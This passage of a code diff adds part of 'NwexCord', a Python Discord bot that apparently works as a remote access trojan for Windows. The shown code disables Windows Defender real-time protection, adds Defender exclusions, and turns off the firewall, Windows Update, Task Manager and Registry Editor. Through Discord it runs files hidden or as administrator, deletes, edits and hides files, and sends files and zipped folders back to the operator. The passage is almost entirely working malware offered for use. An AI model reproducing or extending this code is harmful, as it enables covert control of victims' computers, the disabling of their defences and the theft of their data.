+        except:
+            return True  # Default assume enabled
+
+    @staticmethod
+    def wd_toggle(enable: bool):
+        """Enable or Disable Windows Defender Real-Time Protection."""
+        try:
+            value = "$false" if enable else "$true"
+            cmd = f'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring {value}"'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15, encoding='utf-8', errors='replace')
+            if result.returncode == 0:
+                state = "Enabled" if enable else "Disabled"
+                return True, f"Windows Defender Real-Time Protection {state}."
+            return False, result.stderr.strip() or "Failed to modify Windows Defender. Run as administrator."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def get_wd_status():
+        """Get current Windows Defender Real-Time Protection status (True = enabled)."""
+        try:
+            result = subprocess.run(
+                'powershell -Command "(Get-MpPreference).DisableRealtimeMonitoring"',
+                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
+            )
+            output = result.stdout.strip().lower()
+            if output == "true":
+                return False  # Disabled
+            return True  # Enabled
+        except:
+            return True
+
+    @staticmethod
+    def wd_exclusion(path: str):
+        """Add a path to Windows Defender exclusions."""
+        try:
+            cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15, encoding='utf-8', errors='replace')
+            if result.returncode == 0:
+                return True, f"Exclusion added: `{path}`"
+            return False, result.stderr.strip() or "Failed to add exclusion. Run as administrator."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def windows_update(enable: bool):
+        """Enable or Disable Windows Update service."""
+        try:
+            if enable:
+                cmds = [
+                    'sc config wuauserv start= auto',
+                    'net start wuauserv'
+                ]
+            else:
+                cmds = [
+                    'net stop wuauserv',
+                    'sc config wuauserv start= disabled'
+                ]
+            output = ""
+            for cmd in cmds:
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15, encoding='utf-8', errors='replace')
+                output += result.stdout + result.stderr + "\n"
+            state = "Enabled" if enable else "Disabled"
+            return True, f"Windows Update {state}."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def regedit_toggle(enable: bool):
+        """Enable or Disable Registry Editor (regedit.exe) access."""
+        try:
+            value = "0" if enable else "1"
+            cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools /t REG_DWORD /d {value} /f'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
+            if result.returncode == 0:
+                state = "Enabled" if enable else "Disabled"
+                return True, f"Registry Editor {state}."
+            return False, result.stderr.strip() or "Failed to modify Registry Editor access."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def firewall_toggle(enable: bool):
+        """Enable or Disable Windows Firewall."""
+        try:
+            state_str = "on" if enable else "off"
+            cmd = f'netsh advfirewall set allprofiles state {state_str}'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
+            # When enabling Firewall, also re-enable registry tools to fix "Registry editing has been disabled" error
+            if enable:
+                fix_cmds = [
+                    'powershell -Command "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRegistryTools\" -Value 0 -ErrorAction SilentlyContinue"',
+                    'powershell -Command "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRegistryTools\" -Value 0 -ErrorAction SilentlyContinue"',
+                    'powershell -Command "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value 0 -ErrorAction SilentlyContinue"',
+                    'powershell -Command "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value 0 -ErrorAction SilentlyContinue"',
+                ]
+                for fix_cmd in fix_cmds:
+                    subprocess.run(fix_cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
+            if result.returncode == 0:
+                state = "Enabled" if enable else "Disabled"
+                return True, f"Windows Firewall {state}."
+            return False, result.stderr.strip() or "Failed to modify Firewall."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def taskmgr_toggle(enable: bool):
+        """Enable or Disable Task Manager."""
+        try:
+            value = "0" if enable else "1"
+            cmds = [
+                f'powershell -Command "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value {value} -ErrorAction SilentlyContinue"',
+                f'powershell -Command "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value {value} -ErrorAction SilentlyContinue"',
+            ]
+            # When enabling Task Manager, also re-enable registry tools to fix "Registry editing has been disabled" error
+            if enable:
+                cmds.extend([
+                    'powershell -Command "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRegistryTools\" -Value 0 -ErrorAction SilentlyContinue"',
+                    'powershell -Command "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableRegistryTools\" -Value 0 -ErrorAction SilentlyContinue"',
+                ])
+            for cmd in cmds:
+                subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
+            state = "Enabled" if enable else "Disabled"
+            return True, f"Task Manager {state}."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def get_firewall_status():
+        """Get current firewall status."""
+        try:
+            result = subprocess.run(
+                'netsh advfirewall show allprofiles state',
+                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
+            )
+            return "ON" in result.stdout.upper() or "AÇIK" in result.stdout.upper()
+        except:
+            return True
+
+    @staticmethod
+    def get_taskmgr_status():
+        """Get current Task Manager status (True = enabled)."""
+        try:
+            result = subprocess.run(
+                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr',
+                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
+            )
+            if "0x1" in result.stdout:
+                return False  # Disabled
+            return True  # Enabled
+        except:
+            return True
+
+    @staticmethod
+    def get_regedit_status():
+        """Get current Regedit status (True = enabled)."""
+        try:
+            result = subprocess.run(
+                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools',
+                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
+            )
+            if "0x1" in result.stdout:
+                return False  # Disabled
+            return True  # Enabled
+        except:
+            return True
+
+    @staticmethod
+    def get_winupdate_status():
+        """Get current Windows Update service status (True = running)."""
+        try:
+            result = subprocess.run(
+                'sc query wuauserv',
+                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
+            )
+            return "RUNNING" in result.stdout.upper()
+        except:
+            return True
+
+    @staticmethod
+    def file_manager_list(path: str):
+        """List files and directories in a given path."""
+        try:
+            if not os.path.exists(path):
+                return False, f"Path not found: {path}", []
+            items = []
+            for entry in os.scandir(path):
+                try:
+                    is_dir = entry.is_dir()
+                    size = ""
+                    modified = ""
+                    file_type = "Folder" if is_dir else ""
+                    if not is_dir:
+                        try:
+                            stat = entry.stat()
+                            size_bytes = stat.st_size
+                            if size_bytes < 1024:
+                                size = f"{size_bytes}B"
+                            elif size_bytes < 1024 * 1024:
+                                size = f"{size_bytes / 1024:.0f}KB"
+                            else:
+                                size = f"{size_bytes / (1024*1024):.1f}MB"
+                            modified = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
+                            ext = os.path.splitext(entry.name)[1].lower()
+                            file_type = ext[1:].upper() if ext else "File"
+                        except:
+                            size = "?"
+                            file_type = "File"
+                    else:
+                        try:
+                            stat = entry.stat()
+                            modified = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
+                        except:
+                            modified = ""
+                    items.append({
+                        "name": entry.name,
+                        "is_dir": is_dir,
+                        "size": size,
+                        "modified": modified,
+                        "type": file_type,
+                        "full_path": entry.path
+                    })
+                except PermissionError:
+                    items.append({
+                        "name": entry.name,
+                        "is_dir": False,
+                        "size": "?",
+                        "modified": "",
+                        "type": "?",
+                        "full_path": os.path.join(path, entry.name)
+                    })
+            items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
+            return True, path, items
+        except Exception as e:
+            return False, str(e), []
+
+    @staticmethod
+    def file_delete(path: str):
+        """Delete a file or directory."""
+        try:
+            if os.path.isdir(path):
+                import shutil
+                shutil.rmtree(path)
+                return True, f"Folder deleted: `{os.path.basename(path)}`"
+            elif os.path.isfile(path):
+                os.remove(path)
+                return True, f"File deleted: `{os.path.basename(path)}`"
+            return False, "Path not found."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def file_rename(old_path: str, new_name: str):
+        """Rename a file or directory."""
+        try:
+            parent = os.path.dirname(old_path)
+            new_path = os.path.join(parent, new_name)
+            os.rename(old_path, new_path)
+            return True, f"Renamed: `{os.path.basename(old_path)}` → `{new_name}`"
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def file_new_folder(parent: str, name: str):
+        """Create a new folder."""
+        try:
+            path = os.path.join(parent, name)
+            os.makedirs(path, exist_ok=True)
+            return True, f"Folder created: `{name}`"
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def file_new_file(parent: str, name: str, content: str = ""):
+        """Create a new file."""
+        try:
+            path = os.path.join(parent, name)
+            with open(path, 'w', encoding='utf-8') as f:
+                f.write(content)
+            return True, f"File created: `{name}`"
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def file_execute(path: str, mode: str = "normal"):
+        """Execute a file: normal, hidden, or runas."""
+        try:
+            if not os.path.exists(path):
+                return False, "File not found."
+            if mode == "hidden":
+                si = subprocess.STARTUPINFO()
+                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                si.wShowWindow = 0  # SW_HIDE
+                subprocess.Popen(path, shell=True, startupinfo=si)
+                return True, f"Executed (Hidden): `{os.path.basename(path)}`"
+            elif mode == "runas":
+                ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", path, None, None, 1)
+                if ret > 32:
+                    return True, f"Executed (RunAs): `{os.path.basename(path)}`"
+                return False, f"RunAs failed (code {ret})."
+            else:
+                subprocess.Popen(path, shell=True)
+                return True, f"Executed (Normal): `{os.path.basename(path)}`"
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def file_set_background(path: str):
+        """Set an image as the desktop wallpaper."""
+        try:
+            import ctypes
+            SPI_SETDESKWALLPAPER = 0x0014
+            result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)
+            if result:
+                return True, f"Wallpaper set: `{os.path.basename(path)}`"
+            return False, "Failed to set wallpaper."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def file_edit_read(path: str):
+        """Read a text file for editing (max 2000 chars)."""
+        try:
+            with open(path, 'r', encoding='utf-8', errors='replace') as f:
+                content = f.read(2000)
+            return True, content
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def file_edit_write(path: str, content: str):
+        """Write content to a text file."""
+        try:
+            with open(path, 'w', encoding='utf-8') as f:
+                f.write(content)
+            return True, f"File saved: `{os.path.basename(path)}`"
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def folder_lock(path: str):
+        """Lock a folder (deny access) using icacls."""
+        try:
+            cmd = f'icacls "{path}" /deny Everyone:(OI)(CI)F'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
+            if result.returncode == 0:
+                return True, f"Folder locked: `{os.path.basename(path)}`"
+            return False, result.stderr.strip() or "Failed to lock folder."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def folder_unlock(path: str):
+        """Unlock a folder (remove deny) using icacls."""
+        try:
+            cmd = f'icacls "{path}" /remove:d Everyone'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
+            if result.returncode == 0:
+                return True, f"Folder unlocked: `{os.path.basename(path)}`"
+            return False, result.stderr.strip() or "Failed to unlock folder."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def file_show(path: str):
+        """Show a hidden file/folder using attrib."""
+        try:
+            cmd = f'attrib -h -s "{path}"'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
+            if result.returncode == 0:
+                return True, f"Shown: `{os.path.basename(path)}`"
+            return False, result.stderr.strip() or "Failed."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def file_hide(path: str):
+        """Hide a file/folder using attrib."""
+        try:
+            cmd = f'attrib +h +s "{path}"'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
+            if result.returncode == 0:
+                return True, f"Hidden: `{os.path.basename(path)}`"
+            return False, result.stderr.strip() or "Failed."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def folder_download_zip(path: str):
+        """Zip a folder and return the zip path."""
+        try:
+            import shutil
+            zip_name = os.path.join(tempfile.gettempdir(), f"fm_{os.path.basename(path)}")
+            zip_path = shutil.make_archive(zip_name, 'zip', path)
+            return True, zip_path
+        except Exception as e:
+            return False, str(e)
+
+
+# ========================================
+# Interactive File Manager UI
+# ========================================
+
+def build_file_manager_embed(current_path: str, session_id: str, items: list = None, selected_idx: int = -1, search_query: str = ""):
+    """Build the File Manager embed with table layout."""
+    if items is None:
+        success, path_or_msg, items = WindowsManager.file_manager_list(current_path)
+        if not success:
+            embed = discord.Embed(
+                title=f"📂 File Manager : {session_id}",
+                description=f"❌ {path_or_msg}",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="NwexCord • File Manager")
+            return embed, [], 0, 0
+
+    # Filter by search
+    if search_query:
+        items = [i for i in items if search_query.lower() in i['name'].lower()]
+
+    # Count folders and files
+    folder_count = sum(1 for i in items if i['is_dir'])
+    file_count = sum(1 for i in items if not i['is_dir'])
+
+    # Build table
+    header = f"{'[ Name ]':<32} {'[ Date modified ]':<18} {'[ Type ]':<8} {'[ Size ]'}"
+    sep = "━" * 72
+
+    rows = ""
+    for i, item in enumerate(items[:25]):
+        name = item['name']
+        if len(name) > 28:
+            name = name[:25] + "..."
+        modified = item.get('modified', '')[:16]
+        ftype = item.get('type', '')[:6]
+        size = item.get('size', '') if not item['is_dir'] else ''
+
+        marker = "►" if i == selected_idx else " "
+        icon = "📁" if item['is_dir'] else "📄"
+        rows += f"{marker}{icon} {name:<28} {modified:<16} {ftype:<6} {size}\n"
+
+    if not items:
+        rows = "  (empty directory)\n"
+
+    table_block = f"```\n{header}\n{sep}\n{rows}```"
+    if len(table_block) > 3800:
+        table_block = table_block[:3790] + "\n...```"
+
+    selected_name = ""
+    if 0 <= selected_idx < len(items):
+        selected_name = items[selected_idx]['name']
+
+    embed = discord.Embed(
+        title=f"📂 File Manager : {session_id}",
+        description=table_block,
+        color=discord.Color.from_rgb(0, 120, 215)
+    )
+    path_display = current_path if len(current_path) <= 60 else "..." + current_path[-57:]
+    embed.set_footer(text=f"{path_display}\nFolder[{folder_count}]  Files[{file_count}]")
+
+    return embed, items, folder_count, file_count
+
+
+class FileManagerItemSelect(discord.ui.Select):
+    """Dropdown to select a file/folder from the listing."""
+    def __init__(self, session_id: str, current_path: str, items: list):
+        self.session_id = session_id
+        self.current_path = current_path
+        self.items_data = items
+
+        if items:
+            options = []
+            for i, item in enumerate(items[:25]):
+                label = item['name'][:100]
+                desc = f"{item['type']} | {item['size']}" if not item['is_dir'] else "Folder"
+                emoji = "📁" if item['is_dir'] else "📄"
+                options.append(discord.SelectOption(
+                    label=label,
+                    description=desc[:100],
+                    value=str(i),
+                    emoji=emoji
+                ))
+        else:
+            options = [discord.SelectOption(label="(empty)", value="_none")]
+
+        super().__init__(placeholder="📂 Select a file or folder...", options=options, row=0)
+
+    async def callback(self, interaction: discord.Interaction):
+        selected = self.values[0]
+        if selected == "_none":
+            await interaction.response.defer()
+            return
+
+        idx = int(selected)
+        # If it's a directory, navigate into it
+        if idx < len(self.items_data) and self.items_data[idx]['is_dir']:
+            new_path = os.path.join(self.current_path, self.items_data[idx]['name'])
+            embed, items, fc, fic = build_file_manager_embed(new_path, self.session_id)
+            view = FileManagerView(self.session_id, new_path, items)
+            await interaction.response.edit_message(content=None, embed=embed, view=view)
+        else:
+            # Select the file and show actions
+            embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id, self.items_data, selected_idx=idx)
+            view = FileManagerView(self.session_id, self.current_path, self.items_data, selected_idx=idx)
+            await interaction.response.edit_message(content=None, embed=embed, view=view)
+
+
+class FileManagerActionSelect(discord.ui.Select):
+    """Dropdown for file/folder actions."""
+    def __init__(self, session_id: str, current_path: str, items: list, selected_idx: int = -1):
+        self.session_id = session_id
+        self.current_path = current_path
+        self.items_data = items
+        self.selected_idx = selected_idx
+
+        options = [
+            discord.SelectOption(label="Back", emoji="⬅", value="back", description="Go to parent directory"),
+            discord.SelectOption(label="Refresh", emoji="🔄", value="refresh", description="Refresh file listing"),
+            discord.SelectOption(label="Execute", emoji="▶️", value="execute", description="Execute selected (Normal)"),
+            discord.SelectOption(label="Execute Hidden", emoji="👻", value="execute_hidden", description="Execute hidden"),
+            discord.SelectOption(label="Execute RunAs", emoji="🛡️", value="execute_runas", description="Execute as admin"),
+            discord.SelectOption(label="Delete", emoji="🗑️", value="delete", description="Delete selected item"),
+            discord.SelectOption(label="Download", emoji="⬇", value="download", description="Download selected file"),
+            discord.SelectOption(label="Rename", emoji="✏️", value="rename", description="Rename selected item"),
+            discord.SelectOption(label="Upload", emoji="⬆", value="upload", description="Upload a file here"),
+            discord.SelectOption(label="New Folder", emoji="📁", value="new_folder", description="Create new folder"),
+            discord.SelectOption(label="New File", emoji="📄", value="new_file", description="Create new file"),
+            discord.SelectOption(label="Edit", emoji="📝", value="edit", description="Edit text file"),
+            discord.SelectOption(label="Lock Folder", emoji="🔒", value="lock", description="Lock selected folder"),
+            discord.SelectOption(label="Unlock Folder", emoji="🔓", value="unlock", description="Unlock selected folder"),
+            discord.SelectOption(label="Show File/Folder", emoji="👁", value="show", description="Unhide file/folder"),
+            discord.SelectOption(label="Hide File/Folder", emoji="🙈", value="hide", description="Hide file/folder"),
+            discord.SelectOption(label="Set Background", emoji="🖼️", value="set_bg", description="Set image as wallpaper"),
+            discord.SelectOption(label="Download Folder", emoji="📦", value="download_folder", description="Download folder as zip"),
+        ]
+
+        super().__init__(placeholder="⚡ Select an action...", options=options, row=1)
+
+    async def callback(self, interaction: discord.Interaction):
+        action = self.values[0]
+        selected_item = self.items_data[self.selected_idx] if 0 <= self.selected_idx < len(self.items_data) else None
+        selected_path = selected_item['full_path'] if selected_item else None
+
+        if action == "back":
+            parent = os.path.dirname(self.current_path)
+            if not parent or parent == self.current_path:
+                parent = self.current_path
+            embed, items, fc, fic = build_file_manager_embed(parent, self.session_id)
+            view = FileManagerView(self.session_id, parent, items)
+            await interaction.response.edit_message(content=None, embed=embed, view=view)
+
+        elif action == "refresh":
+            embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+            view = FileManagerView(self.session_id, self.current_path, items)
+            await interaction.response.edit_message(content=None, embed=embed, view=view)
+
+        elif action in ("execute", "execute_hidden", "execute_runas"):
+            if not selected_path:
+                await interaction.response.send_message("❌ Select a file first!", ephemeral=True)
+                return
+            mode_map = {"execute": "normal", "execute_hidden": "hidden", "execute_runas": "runas"}
+            await interaction.response.defer()
+            loop = asyncio.get_event_loop()
+            success, msg = await loop.run_in_executor(None, WindowsManager.file_execute, selected_path, mode_map[action])
+            embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+            status = "✅" if success else "❌"
+            embed.add_field(name=f"{status} Execute", value=msg, inline=False)
+            view = FileManagerView(self.session_id, self.current_path, items)
+            await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+        elif action == "delete":
+            if not selected_path:
+                await interaction.response.send_message("❌ Select an item first!", ephemeral=True)
+                return
+            await interaction.response.defer()
+            loop = asyncio.get_event_loop()
+            success, msg = await loop.run_in_executor(None, WindowsManager.file_delete, selected_path)
+            embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+            status = "✅" if success else "❌"
+            embed.add_field(name=f"{status} Delete", value=msg, inline=False)
+            view = FileManagerView(self.session_id, self.current_path, items)
+            await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+        elif action == "download":
+            if not selected_path or not os.path.isfile(selected_path):
+                await interaction.response.send_message("❌ Select a file first!", ephemeral=True)
+                return
+            try:
+                file_size = os.path.getsize(selected_path)
+                if file_size > 25 * 1024 * 1024:  # 25MB Discord limit
+                    await interaction.response.send_message("❌ File too large (>25MB).", ephemeral=True)
+                    return
+                await interaction.response.defer()
+                file = discord.File(selected_path, filename=os.path.basename(selected_path))
+                await interaction.followup.send(file=file, ephemeral=False)
+            except Exception as e:
+                try:
+                    await interaction.response.send_message(f"❌ {e}", ephemeral=True)
+                except:
+                    await interaction.followup.send(f"❌ {e}", ephemeral=True)
+
+        elif action == "rename":
+            if not selected_path:
+                await interaction.response.send_message("❌ Select an item first!", ephemeral=True)
+                return
+            await interaction.response.send_modal(FMRenameModal(self.session_id, self.current_path, selected_path))
+
+        elif action == "upload":
+            await interaction.response.send_message(
+                "📤 **Upload a file** by sending it as an attachment in this channel.\n"
+                f"It will be saved to: `{self.current_path}`\n\n"
+                "*Reply to this message with an attached file.*",
+                ephemeral=True
+            )
+
+        elif action == "new_folder":
+            await interaction.response.send_modal(FMNewFolderModal(self.session_id, self.current_path))
+
+        elif action == "new_file":
+            await interaction.response.send_modal(FMNewFileModal(self.session_id, self.current_path))
+
+        elif action == "edit":
+            if not selected_path or not os.path.isfile(selected_path):
+                await interaction.response.send_message("❌ Select a text file first!", ephemeral=True)
+                return
+            success, content = WindowsManager.file_edit_read(selected_path)
+            if not success:
+                await interaction.response.send_message(f"❌ {content}", ephemeral=True)
+                return
+            await interaction.response.send_modal(FMEditFileModal(self.session_id, self.current_path, selected_path, content))
+
+        elif action == "lock":
+            if not selected_path or not os.path.isdir(selected_path):
+                await interaction.response.send_message("❌ Select a folder first!", ephemeral=True)
+                return
+            await interaction.response.defer()
+            loop = asyncio.get_event_loop()
+            success, msg = await loop.run_in_executor(None, WindowsManager.folder_lock, selected_path)
+            embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+            status = "🔒" if success else "❌"
+            embed.add_field(name=f"{status} Folder Lock", value=msg, inline=False)
+            view = FileManagerView(self.session_id, self.current_path, items)
+            await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+        elif action == "unlock":
+            if not selected_path or not os.path.isdir(selected_path):
+                await interaction.response.send_message("❌ Select a folder first!", ephemeral=True)
+                return
+            await interaction.response.defer()
+            loop = asyncio.get_event_loop()
+            success, msg = await loop.run_in_executor(None, WindowsManager.folder_unlock, selected_path)
+            embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+            status = "🔓" if success else "❌"
+            embed.add_field(name=f"{status} Folder Unlock", value=msg, inline=False)
+            view = FileManagerView(self.session_id, self.current_path, items)
+            await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+        elif action == "show":
+            if not selected_path:
+                await interaction.response.send_message("❌ Select an item first!", ephemeral=True)
+                return
+            await interaction.response.defer()
+            loop = asyncio.get_event_loop()
+            success, msg = await loop.run_in_executor(None, WindowsManager.file_show, selected_path)
+            embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+            status = "👁" if success else "❌"
+            embed.add_field(name=f"{status} Show", value=msg, inline=False)
+            view = FileManagerView(self.session_id, self.current_path, items)
+            await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+        elif action == "hide":
+            if not selected_path:
+                await interaction.response.send_message("❌ Select an item first!", ephemeral=True)
+                return
+            await interaction.response.defer()
+            loop = asyncio.get_event_loop()
+            success, msg = await loop.run_in_executor(None, WindowsManager.file_hide, selected_path)
+            embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+            status = "🙈" if success else "❌"
+            embed.add_field(name=f"{status} Hide", value=msg, inline=False)
+            view = FileManagerView(self.session_id, self.current_path, items)
+            await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+        elif action == "set_bg":
+            if not selected_path or not os.path.isfile(selected_path):
+                await interaction.response.send_message("❌ Select an image file first!", ephemeral=True)
+                return
+            await interaction.response.defer()
+            loop = asyncio.get_event_loop()
+            success, msg = await loop.run_in_executor(None, WindowsManager.file_set_background, selected_path)
+            embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+            status = "🖼️" if success else "❌"
+            embed.add_field(name=f"{status} Set Background", value=msg, inline=False)
+            view = FileManagerView(self.session_id, self.current_path, items)
+            await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+        elif action == "download_folder":
+            if not selected_path or not os.path.isdir(selected_path):
+                await interaction.response.send_message("❌ Select a folder first!", ephemeral=True)
+                return
+            await interaction.response.defer()
+            loop = asyncio.get_event_loop()
+            success, result = await loop.run_in_executor(None, WindowsManager.folder_download_zip, selected_path)
+            if success:
+                try:
+                    file_size = os.path.getsize(result)
+                    if file_size > 25 * 1024 * 1024:
+                        await interaction.followup.send("❌ Zip file too large (>25MB).", ephemeral=True)
+                        os.remove(result)
+                        return
+                    file = discord.File(result, filename=os.path.basename(result))
+                    await interaction.followup.send(file=file, ephemeral=False)
+                    os.remove(result)
+                except Exception as e:
+                    await interaction.followup.send(f"❌ {e}", ephemeral=True)
+            else:
+                await interaction.followup.send(f"❌ {result}", ephemeral=True)
+
+
+class FMRenameModal(discord.ui.Modal, title="✏️ Rename"):
+    new_name = discord.ui.TextInput(label="New Name", placeholder="new_name.txt", required=True)
+
+    def __init__(self, session_id: str, current_path: str, target_path: str):
+        super().__init__()
+        self.session_id = session_id
+        self.current_path = current_path
+        self.target_path = target_path
+        self.new_name.default = os.path.basename(target_path)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.file_rename, self.target_path, str(self.new_name))
+        embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+        status = "✅" if success else "❌"
+        embed.add_field(name=f"{status} Rename", value=msg, inline=False)
+        view = FileManagerView(self.session_id, self.current_path, items)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+
+class FMNewFolderModal(discord.ui.Modal, title="📁 New Folder"):
+    folder_name = discord.ui.TextInput(label="Folder Name", placeholder="New Folder", required=True)
+
+    def __init__(self, session_id: str, current_path: str):
+        super().__init__()
+        self.session_id = session_id
+        self.current_path = current_path
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.file_new_folder, self.current_path, str(self.folder_name))
+        embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+        status = "✅" if success else "❌"
+        embed.add_field(name=f"{status} New Folder", value=msg, inline=False)
+        view = FileManagerView(self.session_id, self.current_path, items)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+
+class FMNewFileModal(discord.ui.Modal, title="📄 New File"):
+    file_name = discord.ui.TextInput(label="File Name", placeholder="file.txt", required=True)
+    file_content = discord.ui.TextInput(label="Content (optional)", placeholder="File content...", style=discord.TextStyle.paragraph, required=False)
+
+    def __init__(self, session_id: str, current_path: str):
+        super().__init__()
+        self.session_id = session_id
+        self.current_path = current_path
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        loop = asyncio.get_event_loop()
+        content = str(self.file_content) if self.file_content else ""
+        success, msg = await loop.run_in_executor(None, WindowsManager.file_new_file, self.current_path, str(self.file_name), content)
+        embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+        status = "✅" if success else "❌"
+        embed.add_field(name=f"{status} New File", value=msg, inline=False)
+        view = FileManagerView(self.session_id, self.current_path, items)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+
+class FMEditFileModal(discord.ui.Modal, title="📝 Edit File"):
+    file_content = discord.ui.TextInput(label="File Content", style=discord.TextStyle.paragraph, required=True, max_length=4000)
+
+    def __init__(self, session_id: str, current_path: str, target_path: str, content: str):
+        super().__init__()
+        self.session_id = session_id
+        self.current_path = current_path
+        self.target_path = target_path
+        self.file_content.default = content[:4000]
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.file_edit_write, self.target_path, str(self.file_content))
+        embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+        status = "✅" if success else "❌"
+        embed.add_field(name=f"{status} Edit", value=msg, inline=False)
+        view = FileManagerView(self.session_id, self.current_path, items)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+
+class FMSearchModal(discord.ui.Modal, title="🔍 Search Files"):
+    search_query = discord.ui.TextInput(label="Search", placeholder="*.txt, filename...", required=True)
+
+    def __init__(self, session_id: str, current_path: str):
+        super().__init__()
+        self.session_id = session_id
+        self.current_path = current_path
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer()
